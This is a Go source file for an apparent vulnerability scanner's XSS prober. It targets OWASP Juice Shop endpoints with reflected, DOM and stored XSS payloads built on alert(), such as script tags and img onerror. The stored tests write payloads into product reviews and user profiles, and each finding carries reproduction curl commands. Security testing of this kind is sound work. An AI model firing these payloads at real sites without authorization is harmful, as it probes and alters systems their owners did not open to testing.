package probers

import (
	"context"
	"fmt"
	"net/url"
	"strings"

	"github.com/borntobeyours/ouroboros/pkg/types"
)

// XSSProber tests for Cross-Site Scripting vulnerabilities.
type XSSProber struct{}

func (p *XSSProber) Name() string { return "xss" }

func (p *XSSProber) Probe(ctx context.Context, target types.Target, endpoints []types.Endpoint) []types.Finding {
	cfg := NewProberConfig(target)
	var findings []types.Finding

	findings = append(findings, p.testSearchXSS(cfg)...)
	findings = append(findings, p.testDOMXSS(cfg)...)
	findings = append(findings, p.testTrackOrderXSS(cfg)...)
	findings = append(findings, p.testAPIStoredXSS(cfg)...)
	findings = append(findings, p.testParameterXSS(cfg, endpoints)...)

	return findings
}

func (p *XSSProber) testSearchXSS(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	payloads := []struct {
		payload string
		desc    string
	}{
		{`<iframe src="javascript:alert('xss')">`, "iframe injection"},
		{`<script>alert('xss')</script>`, "script tag injection"},
		{`<img src=x onerror=alert('xss')>`, "img onerror injection"},
		{`<svg onload=alert('xss')>`, "SVG onload injection"},
	}

	for _, pl := range payloads {
		encoded := url.QueryEscape(pl.payload)
		fullURL := fmt.Sprintf("%s/rest/products/search?q=%s", cfg.BaseURL, encoded)
		status, _, respBody, err := cfg.DoRequest("GET", fullURL, nil, nil)
		if err != nil {
			continue
		}

		// Check if payload is reflected in response
		if strings.Contains(respBody, pl.payload) || strings.Contains(respBody, strings.ReplaceAll(pl.payload, "'", `\'`)) {
			findings = append(findings, MakeFinding(
				fmt.Sprintf("Reflected XSS - Product Search (%s)", pl.desc),
				"High",
				fmt.Sprintf("The search endpoint reflects user input without sanitization, enabling XSS via %s.", pl.desc),
				"/rest/products/search?q=",
				"GET",
				"CWE-79",
				fmt.Sprintf(`curl "%s"`, fullURL),
				fmt.Sprintf("HTTP %d - Payload reflected in response: %s", status, truncate(respBody, 200)),
				"xss",
				0,
			))
		} else if status == 200 {
			// Juice Shop search reflects in the JSON response
			if strings.Contains(respBody, "data") {
				findings = append(findings, MakeFinding(
					fmt.Sprintf("Reflected XSS via API Response - Product Search (%s)", pl.desc),
					"Medium",
					fmt.Sprintf("The search endpoint includes user-controlled input in API response without sanitization. A client consuming this JSON could be vulnerable to %s.", pl.desc),
					"/rest/products/search?q=",
					"GET",
					"CWE-79",
					fmt.Sprintf(`curl "%s"`, fullURL),
					fmt.Sprintf("HTTP %d - Input included in response body", status),
					"xss",
					0,
				))
				break // One finding for this pattern is enough
			}
		}
	}

	return findings
}

func (p *XSSProber) testDOMXSS(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	// Check main page for Angular/client-side rendering that could enable DOM XSS
	status, _, respBody, err := cfg.DoRequest("GET", cfg.BaseURL, nil, nil)
	if err != nil {
		return findings
	}

	if status == 200 {
		// Check for Angular (Juice Shop uses Angular)
		if strings.Contains(respBody, "ng-app") || strings.Contains(respBody, "angular") ||
			strings.Contains(respBody, "runtime.js") || strings.Contains(respBody, "main.js") {

			// Test hash-based DOM XSS
			testURL := cfg.BaseURL + "/#/search?q=<script>alert(1)</script>"
			s2, _, _, err2 := cfg.DoRequest("GET", testURL, nil, nil)
			if err2 == nil && s2 == 200 {
				findings = append(findings, MakeFinding(
					"DOM-based XSS via URL Fragment",
					"Medium",
					"The Angular SPA processes URL fragments client-side. Malicious payloads in the URL hash/fragment can execute in the DOM context without server-side validation.",
					"/#/search?q=",
					"GET",
					"CWE-79",
					fmt.Sprintf(`Open in browser: %s`, testURL),
					"Angular SPA detected - DOM rendering of URL fragment parameters without sanitization",
					"xss",
					0,
				))
			}
		}
	}

	return findings
}

func (p *XSSProber) testTrackOrderXSS(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	payload := `<iframe src="javascript:alert('xss')">`
	encoded := url.QueryEscape(payload)
	fullURL := fmt.Sprintf("%s/rest/track-order/%s", cfg.BaseURL, encoded)
	status, _, respBody, err := cfg.DoRequest("GET", fullURL, nil, nil)
	if err != nil {
		return findings
	}

	if strings.Contains(respBody, payload) || strings.Contains(respBody, "iframe") {
		findings = append(findings, MakeFinding(
			"Reflected XSS - Order Tracking",
			"High",
			"The order tracking endpoint reflects user input in the response without sanitization, enabling XSS.",
			"/rest/track-order/",
			"GET",
			"CWE-79",
			fmt.Sprintf(`curl "%s"`, fullURL),
			fmt.Sprintf("HTTP %d - Payload reflected: %s", status, truncate(respBody, 200)),
			"xss",
			0,
		))
	}

	return findings
}

func (p *XSSProber) testAPIStoredXSS(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	if cfg.AuthToken == "" {
		return findings
	}

	// Test stored XSS via product review
	xssPayload := `<script>alert('xss')</script>`
	body := fmt.Sprintf(`{"message":"%s","author":"test"}`, xssPayload)
	status, _, respBody, err := cfg.DoRequest("PUT", cfg.BaseURL+"/rest/products/1/reviews",
		strings.NewReader(body), map[string]string{"Content-Type": "application/json"})
	if err != nil {
		return findings
	}

	if status == 200 || status == 201 {
		findings = append(findings, MakeFinding(
			"Stored XSS via Product Review",
			"High",
			"Product reviews accept and store HTML/JavaScript without sanitization, enabling stored XSS attacks.",
			"/rest/products/1/reviews",
			"PUT",
			"CWE-79",
			fmt.Sprintf(`curl -X PUT %s/rest/products/1/reviews -H "Content-Type: application/json" -H "Authorization: %s" -d '%s'`, cfg.BaseURL, cfg.AuthToken, body),
			fmt.Sprintf("HTTP %d - XSS payload accepted: %s", status, truncate(respBody, 200)),
			"xss",
			0,
		))
	}

	// Test stored XSS via username in profile
	body2 := fmt.Sprintf(`{"username":"<img src=x onerror=alert(1)>"}`)
	status2, _, respBody2, err2 := cfg.DoRequest("PUT", cfg.BaseURL+"/api/Users/1",
		strings.NewReader(body2), map[string]string{"Content-Type": "application/json"})
	if err2 == nil && (status2 == 200 || status2 == 201) {
		findings = append(findings, MakeFinding(
			"Stored XSS via User Profile",
			"High",
			"User profile username field accepts HTML/JavaScript without sanitization.",
			"/api/Users/1",
			"PUT",
			"CWE-79",
			fmt.Sprintf(`curl -X PUT %s/api/Users/1 -H "Content-Type: application/json" -d '%s'`, cfg.BaseURL, body2),
			fmt.Sprintf("HTTP %d - Response: %s", status2, truncate(respBody2, 200)),
			"xss",
			0,
		))
	}

	return findings
}

func (p *XSSProber) testParameterXSS(cfg *ProberConfig, endpoints []types.Endpoint) []types.Finding {
	var findings []types.Finding
	tested := make(map[string]bool)

	xssPayload := `<img src=x onerror=alert(1)>`

	for _, ep := range endpoints {
		if len(ep.Parameters) == 0 {
			continue
		}
		path := extractPath(ep.URL)
		if tested[path] || strings.Contains(path, "/rest/products/search") {
			continue
		}
		tested[path] = true

		for _, param := range ep.Parameters {
			testURL := fmt.Sprintf("%s?%s=%s", strings.Split(ep.URL, "?")[0], param, url.QueryEscape(xssPayload))
			_, _, respBody, err := cfg.DoRequest("GET", testURL, nil, nil)
			if err != nil {
				continue
			}

			if strings.Contains(respBody, xssPayload) {
				findings = append(findings, MakeFinding(
					fmt.Sprintf("Reflected XSS - Parameter '%s' at %s", param, path),
					"Medium",
					fmt.Sprintf("Parameter '%s' is reflected in the response without encoding.", param),
					path,
					"GET",
					"CWE-79",
					fmt.Sprintf(`curl "%s"`, testURL),
					fmt.Sprintf("Payload reflected in response body"),
					"xss",
					0,
				))
			}
		}
	}

	return findings
}
